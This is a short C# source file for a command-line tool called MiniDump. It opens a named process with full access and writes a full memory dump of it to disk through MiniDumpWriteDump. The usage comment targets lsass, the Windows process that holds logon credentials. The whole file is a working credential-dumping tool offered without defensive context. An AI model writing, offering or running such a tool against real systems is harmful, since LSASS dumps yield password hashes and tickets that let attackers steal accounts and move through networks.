using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
          IntPtr hFile, int DumpType, IntPtr ExceptionParam,
          IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
          int processId);

        /*
         * Example Usage:
         * MiniDump.exe lsass C:\Temp\lsass.bin
         */
        static void Main(string[] args)
        {
            Process[] lsass = Process.GetProcessesByName(args[0]);
            int lsass_pid = lsass[0].Id;

            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);

            FileStream dumpFile = new FileStream(args[1], FileMode.Create);

            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
